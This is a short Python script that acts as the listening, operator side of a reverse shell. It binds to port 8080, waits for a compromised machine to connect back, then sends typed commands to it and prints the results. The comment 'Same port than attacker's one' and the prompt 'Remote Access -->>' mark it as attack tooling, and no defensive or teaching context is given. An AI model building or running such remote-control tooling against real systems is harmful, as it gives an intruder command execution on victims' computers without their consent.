import socket
ip="0.0.0.0" #Do not change
port=8080 # Same port than attacker's one
c=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
c.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
c.bind((ip,port))
c.listen(1)
conn,addr=c.accept()
print('<+> Connected to ',addr,' and listening on port ',str(port))
while True:
     command=input("Remote Access -->> ")
     if command=='exit':
          conn.send(b'exit')
          conn.close()
          break
     else:
          conn.send(command.encode())
          output=conn.recv(1024)
          print(output)
